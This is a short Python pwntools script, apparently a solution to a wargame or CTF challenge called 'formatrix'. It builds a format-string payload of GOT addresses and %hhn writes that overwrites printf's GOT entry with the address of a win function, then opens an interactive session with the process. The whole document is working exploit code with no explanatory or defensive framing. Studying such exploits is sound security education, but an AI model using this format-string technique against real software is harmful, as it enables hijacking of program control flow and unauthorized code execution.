from pwn import *

def get_n(new, prev, size):
	while new <= prev:
		new += (1 << size)
	return new-prev

def gen_addrs(base_addr):
	addrs = b''
	for i in range(4):
		addrs += p32(base_addr + i)
	return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
	payload = b''
	n_val = [setup_len]
	for i in range(4):
		n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
		payload += '%{}c'.format(n_val[i+1]).encode()
		payload += '%{}$hhn'.format(stack_offset + i).encode()
	return payload

#p = remote('plsdonthaq.me', 4003)
p = process('./formatrix')
context.terminal = 'qterminal'
#gdb.attach(p, ''' break main''')

printf_got_addr = 0x08049c18
win_addr = [c for c in p32(0x08048536)]
print(win_addr)

payload = gen_addrs(printf_got_addr)

setup_len = len(payload)

payload += gen_format_writes(win_addr, setup_len, 3)

print(payload, len(payload))

p.sendline(payload)

p.interactive()
